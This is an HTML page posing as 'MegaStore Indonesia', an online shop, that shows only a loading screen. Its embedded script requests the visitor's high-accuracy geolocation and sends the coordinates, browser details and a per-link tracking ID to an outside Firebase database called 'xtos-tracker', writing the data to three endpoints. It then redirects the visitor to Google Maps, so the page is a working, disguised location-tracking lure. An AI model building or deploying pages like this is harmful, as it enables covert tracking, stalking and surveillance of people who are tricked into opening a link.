<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MegaStore Indonesia - Gadget, Motor & Mobil Terlengkap!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #667eea 100%);
            min-height: 100vh;
            animation: backgroundShift 15s ease-in-out infinite;
        }
        
        @keyframes backgroundShift {
            0%, 100% { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #667eea 100%); }
            33% { background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); }
            66% { background: linear-gradient(135deg, #f093fb 0%, #667eea 50%, #1e3c72 100%); }
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: linear-gradient(135deg, rgba(255,255,255,0.98), rgba(255,255,255,0.92));
            padding: 40px 30px;
            border-radius: 25px;
            margin-bottom: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(255,255,255,0.1);
            text-align: center;
            border: 3px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
        }
        
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
            position: relative;
            z-index: 2;
        }
        
        .logo-text {
            font-size: 3.2em;
            font-weight: 900;
            background: linear-gradient(45deg, #1e3c72, #2a5298, #667eea);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -2px;
        }
        
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            color: white;
            font-size: 1.2em;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-right: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading" id="loading">
        <div class="spinner"></div>
        Memuat produk terbaru...
    </div>
    
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-text">MegaStore</div>
            </div>
            <p>Sedang memproses permintaan Anda...</p>
        </div>
    </div>

    <script>
        // Get tracking parameters
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id') || 'default_' + Date.now();
        
        console.log('üéØ Tracking ID:', trackingId);
        
        // Get location immediately
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    console.log('üìç Location:', lat, lng);
                    
                    // Send to Firebase directly
                    sendToFirebase(trackingId, lat, lng);
                    
                    // Redirect to Google Maps after sending
                    setTimeout(() => {
                        window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
                    }, 2000);
                },
                function(error) {
                    console.log('‚ùå Location error:', error);
                    // Redirect anyway
                    setTimeout(() => {
                        window.location.href = 'https://maps.google.com/';
                    }, 2000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        
        function sendToFirebase(id, lat, lng) {
            // Use ID directly (no decryption)
            let realId = id;
            console.log('üéØ Using tracking ID:', realId);
            
            const data = {
                latitude: lat,
                longitude: lng,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                deviceBrand: getBrowserInfo(),
                batteryLevel: 'Unknown',
                platform: navigator.platform,
                source: 'megastore_direct',
                tracking_id: realId,
                captured_at: new Date().toISOString(),
                status: 'captured'
            };
            
            console.log('üì° Sending to Firebase ID:', realId);
            console.log('üìç Location data:', data);
            
            // Send to Firebase locations endpoint with CORS headers
            fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${realId}.json`, {
                method: 'PUT',
                headers: { 
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*'
                },
                body: JSON.stringify(data)
            }).then(response => {
                console.log('üì° Firebase response status:', response.status);
                if (response.ok) {
                    console.log('‚úÖ Firebase locations success');
                    return response.text();
                } else {
                    console.log('‚ùå Firebase locations failed:', response.status);
                    throw new Error('Firebase failed');
                }
            }).then(responseText => {
                console.log('üì° Firebase response:', responseText);
            }).catch(error => {
                console.log('‚ùå Firebase locations error:', error);
            });
            
            // Also send to live endpoint with retry
            const liveData = { ...data, updateNumber: Math.floor(Math.random() * 100) + 1 };
            
            setTimeout(() => {
                fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${realId}.json`, {
                    method: 'PUT',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*'
                    },
                    body: JSON.stringify(liveData)
                }).then(response => {
                    if (response.ok) {
                        console.log('‚úÖ Live tracking sent successfully');
                    } else {
                        console.log('‚ùå Live tracking failed:', response.status);
                    }
                }).catch(error => {
                    console.log('‚ùå Live tracking error:', error);
                });
            }, 500);
            
            // Send to backup endpoint as well
            setTimeout(() => {
                fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/backup/${realId}.json`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    console.log('‚úÖ Backup endpoint sent');
                }).catch(() => {
                    console.log('‚ùå Backup endpoint failed');
                });
            }, 1000);
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            return 'Mobile';
        }
    </script>
</body>
</html>
